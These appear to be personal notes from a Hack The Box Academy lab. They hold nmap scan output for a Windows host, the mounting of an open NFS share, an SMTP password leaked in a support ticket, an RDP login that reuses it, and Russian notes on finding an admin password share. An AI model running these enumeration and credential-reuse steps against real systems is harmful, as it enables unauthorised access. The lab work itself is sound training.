@@ -1,0 +1,352 @@
+Medium Lab
+
+
+
+└──╼ [★]$ sudo nmap -sV -sC -p 21,22,53,80,443,445,623,3389,1521,3306,1433 10.129.202.41
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-01 08:48 CST
+Nmap scan report for 10.129.202.41
+Host is up (0.050s latency).
+
+PORT     STATE  SERVICE       VERSION
+21/tcp   closed ftp
+22/tcp   closed ssh
+53/tcp   closed domain
+80/tcp   closed http
+443/tcp  closed https
+445/tcp  open   microsoft-ds?
+623/tcp  closed oob-ws-http
+1433/tcp closed ms-sql-s
+1521/tcp closed oracle
+3306/tcp closed mysql
+3389/tcp open   ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-03-01T14:48:32+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=WINMEDIUM
+| Not valid before: 2026-02-28T14:30:23
+|_Not valid after:  2026-08-30T14:30:23
+| rdp-ntlm-info: 
+|   Target_Name: WINMEDIUM
+|   NetBIOS_Domain_Name: WINMEDIUM
+|   NetBIOS_Computer_Name: WINMEDIUM
+|   DNS_Domain_Name: WINMEDIUM
+|   DNS_Computer_Name: WINMEDIUM
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-03-01T14:48:24+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-03-01T14:48:25
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+
+
+Scanning 10.129.202.41 [1000 ports]
+Discovered open port 445/tcp on 10.129.202.41
+Discovered open port 139/tcp on 10.129.202.41
+Discovered open port 3389/tcp on 10.129.202.41
+Discovered open port 111/tcp on 10.129.202.41
+Discovered open port 135/tcp on 10.129.202.41
+
+
+
+
+
+─[eu-academy-3]─[10.10.14.240]─[htb-ac-2182889@htb-jwhgeoutqy]─[~]
+└──╼ [★]$ sudo nmap -sV -sC -p 111,135,139,445,3389 --script "rpc*,smb*,rdp*,nfs*,vuln" --script-args unsafe=1 10.129.202.41
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-01 09:51 CST
+Nmap scan report for 10.129.202.41
+Host is up (0.050s latency).
+
+PORT     STATE SERVICE       VERSION
+111/tcp  open  rpcbind?
+|_rpcinfo: ERROR: Script execution failed (use -d to debug)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
+445/tcp  open  microsoft-ds?
+|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-enum-encryption: 
+|   Security layer
+|     CredSSP (NLA): SUCCESS
+|     CredSSP with Early User Auth: SUCCESS
+|_    RDSTLS: SUCCESS
+| rdp-ntlm-info: 
+|   Target_Name: WINMEDIUM
+|   NetBIOS_Domain_Name: WINMEDIUM
+|   NetBIOS_Computer_Name: WINMEDIUM
+|   DNS_Domain_Name: WINMEDIUM
+|   DNS_Computer_Name: WINMEDIUM
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-03-01T15:52:40+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-capabilities: 
+|   2:0:2: 
+|     Distributed File System
+|   2:1:0: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   3:0:0: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   3:0:2: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   3:1:1: 
+|     Distributed File System
+|     Leasing
+|_    Multi-credit operations
+| smb-protocols: 
+|   dialects: 
+|     2:0:2
+|     2:1:0
+|     3:0:0
+|     3:0:2
+|_    3:1:1
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+|_smb-print-text: false
+| smb2-time: 
+|   date: 2026-03-01T15:52:45
+|_  start_date: N/A
+| smb-mbenum: 
+|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+|_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_smb-flood: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 119.90 seconds
+
+
+
+
+
+
+
+
+
+
+─[eu-academy-3]─[10.10.14.240]─[htb-ac-2182889@htb-jwhgeoutqy]─[~]
+└──╼ [★]$ nmap -sV -sC -v 10.129.202.41
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-01 09:47 CST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 09:47
+Completed NSE at 09:47, 0.00s elapsed
+Initiating NSE at 09:47
+Completed NSE at 09:47, 0.00s elapsed
+Initiating NSE at 09:47
+Completed NSE at 09:47, 0.00s elapsed
+Initiating Ping Scan at 09:47
+Scanning 10.129.202.41 [4 ports]
+Completed Ping Scan at 09:47, 0.09s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 09:47
+Completed Parallel DNS resolution of 1 host. at 09:47, 0.00s elapsed
+Initiating SYN Stealth Scan at 09:47
+Scanning 10.129.202.41 [1000 ports]
+Discovered open port 445/tcp on 10.129.202.41
+Discovered open port 139/tcp on 10.129.202.41
+Discovered open port 3389/tcp on 10.129.202.41
+Discovered open port 111/tcp on 10.129.202.41
+Discovered open port 135/tcp on 10.129.202.41
+Increasing send delay for 10.129.202.41 from 0 to 5 due to 51 out of 169 dropped probes since last increase.
+Increasing send delay for 10.129.202.41 from 5 to 10 due to 11 out of 31 dropped probes since last increase.
+Increasing send delay for 10.129.202.41 from 10 to 20 due to 11 out of 20 dropped probes since last increase.
+Increasing send delay for 10.129.202.41 from 20 to 40 due to 11 out of 15 dropped probes since last increase.
+Discovered open port 2049/tcp on 10.129.202.41
+Increasing send delay for 10.129.202.41 from 40 to 80 due to 11 out of 12 dropped probes since last increase.
+Increasing send delay for 10.129.202.41 from 80 to 160 due to 11 out of 12 dropped probes since last increase.
+Increasing send delay for 10.129.202.41 from 160 to 320 due to 11 out of 11 dropped probes since last increase.
+Increasing send delay for 10.129.202.41 from 320 to 640 due to 11 out of 11 dropped probes since last increase.
+Increasing send delay for 10.129.202.41 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
+SYN Stealth Scan Timing: About 56.88% done; ETC: 09:48 (0:00:30 remaining)
+SYN Stealth Scan Timing: About 59.75% done; ETC: 09:49 (0:00:47 remaining)
+SYN Stealth Scan Timing: About 63.55% done; ETC: 09:49 (0:01:03 remaining)
+SYN Stealth Scan Timing: About 61.52% done; ETC: 09:50 (0:01:31 remaining)
+SYN Stealth Scan Timing: About 70.28% done; ETC: 09:52 (0:01:41 remaining)
+SYN Stealth Scan Timing: About 79.84% done; ETC: 09:54 (0:01:26 remaining)
+SYN Stealth Scan Timing: About 86.56% done; ETC: 09:54 (0:01:04 remaining)
+SYN Stealth Scan Timing: About 92.26% done; ETC: 09:55 (0:00:39 remaining)
+Completed SYN Stealth Scan at 10:00, 778.35s elapsed (1000 total ports)
+Initiating Service scan at 10:00
+Scanning 6 services on 10.129.202.41
+Completed Service scan at 10:00, 50.50s elapsed (6 services on 1 host)
+NSE: Script scanning 10.129.202.41.
+Initiating NSE at 10:00
+Completed NSE at 10:01, 10.22s elapsed
+Initiating NSE at 10:01
+Completed NSE at 10:01, 33.80s elapsed
+Initiating NSE at 10:01
+Completed NSE at 10:01, 0.00s elapsed
+Nmap scan report for 10.129.202.41
+Host is up (0.26s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+111/tcp  open  rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+2049/tcp open  nlockmgr      1-4 (RPC #100021)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=WINMEDIUM
+| Issuer: commonName=WINMEDIUM
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-02-28T14:30:23
+| Not valid after:  2026-08-30T14:30:23
+| MD5:   f0a6:a407:126b:e399:639b:b1c8:f029:3dda
+|_SHA-1: 8f41:4640:d63c:27ae:0e74:c4b9:51ce:53dc:a162:1e1e
+| rdp-ntlm-info: 
+|   Target_Name: WINMEDIUM
+|   NetBIOS_Domain_Name: WINMEDIUM
+|   NetBIOS_Computer_Name: WINMEDIUM
+|   DNS_Domain_Name: WINMEDIUM
+|   DNS_Computer_Name: WINMEDIUM
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-03-01T16:00:53+00:00
+|_ssl-date: 2026-03-01T16:01:03+00:00; +1s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-03-01T16:00:58
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+Initiating NSE at 10:01
+Completed NSE at 10:01, 0.00s elapsed
+Initiating NSE at 10:01
+Completed NSE at 10:01, 0.00s elapsed
+Initiating NSE at 10:01
+Completed NSE at 10:01, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 873.27 seconds
+           Raw packets sent: 2092 (92.024KB) | Rcvd: 15736 (1.574MB)
+
+
+
+
+2049/tcp open  nlockmgr      1-4 (RPC #100021)
+
+
+showmount -e 10.129.31.113
+/TechSupport (everyone)
+
+
+mkdir ~/techsupport
+
+
+sudo mount -t nfs 10.129.31.113:/TechSupport ~/techsupport -o nolock
+
+
+┌─[eu-academy-3]─[10.10.14.240]─[htb-ac-2182889@htb-rmr99xi79d]─[~]
+└──╼ [★]$ sudo ls -la ~/techsupport
+total 72
+drwx------  2 nobody         nogroup        65536 Nov 10  2021 .
+drwx------ 24 htb-ac-2182889 htb-ac-2182889  4096 Mar  1 11:26 ..
+-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283649.txt
+-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283650.txt
+-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283651.txt
+-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283652.txt
+-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283653.txt
+-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283654.txt
+-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283655.txt
+-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283656.txt
+
+
+
+
+
+[eu-academy-3]─[10.10.14.240]─[htb-ac-2182889@htb-rmr99xi79d]─[~]
+└──╼ [★]$ sudo cat ~/techsupport/ticket4238791283782.txt
+Conversation with InlaneFreight Ltd
+
+Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
+---
+01:27 PM | Operator: Hello,. 
+ 
+So what brings you here today?
+01:27 PM | alex: hello
+01:27 PM | Operator: Hey alex!
+01:27 PM | Operator: What do you need help with?
+01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
+01:38 PM | Operator: Of course
+01:42 PM | alex: here it is:
+
+ 1smtp {
+ 2    host=smtp.web.dev.inlanefreight.htb
+ 3    #port=25
+ 4    ssl=true
+ 5    user="alex"
+ 6    password="lol123!mD"
+ 7    from="alex.g@web.dev.inlanefreight.htb"
+
+
+
+
+
+─[eu-academy-3]─[10.10.14.240]─[htb-ac-2182889@htb-rmr99xi79d]─[~]
+└──╼ [★]$ xfreerdp /u:alex /p:'lol123!mD' /v:10.129.31.113 /dynamic-resolution +clipboard /cert:ignore
+[11:30:10:371] [80825:80826] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
+[11:30:11:772] [80825:80826] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[11:30:11:772] [80825:80826] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[11:30:11:786] [80825:80826] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[11:30:11:786] [80825:80826] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[11:30:11:786] [80825:80826] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
+[11:30:13:453] [80825:80826] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
+[11:34:15:874] [80825:80826] [ERROR][com.freerdp.client.x11] - Unknown key with X keycode 0xe6
+[11:34:15:024] [80825:80826] [ERROR][com.freerdp.client.x11] - Unknown key with X keycode 0xe6
+[11:35:45:815] [80825:80826] [ERROR][com.freerdp.client.x11] - Unknown key with X keycode 0xde
+[11:35:45:942] [80825:80826] [ERROR][com.freerdp.client.x11] - Unknown key with X keycode 0xde
+
+
+Дальше:
+На Windows ищем \\127.0.0.1\devshare (там часо файл с паролем админа)
+
+
+Альтернативы (тоже работают почти всегда)
+
+\\localhost\devshare
+\\. \devshare (точка + слеш — тоже loopback)
+\\WINMEDIUM\devshare (по имени машины)
+\\10.129.31.113\devshare (по внешнему IP — тоже сработает, но медленнее и иногда блокируется firewall)
+
+
